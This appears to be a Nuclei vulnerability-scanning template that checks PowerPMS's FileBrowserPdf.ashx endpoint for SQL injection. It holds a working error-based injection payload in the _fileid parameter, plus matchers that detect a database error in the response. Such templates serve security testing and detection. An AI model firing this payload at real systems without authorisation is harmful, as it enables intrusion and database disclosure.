id: PowerPMS-FileBrowserPdf-SqlInjection

info:
  name: PowerPMS-FileBrowserPdf-SqlInjection
  author: iSee857
  severity: high
  description: |
    PowerPMS-FileBrowserPdf-SqlInjection

http:
  - raw:
      - |
        POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _fileid=1'and db_name()>0 --

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "success"
          - "false"
          - "nvarchar"
        condition: and

      - type: status
        status:
          - 200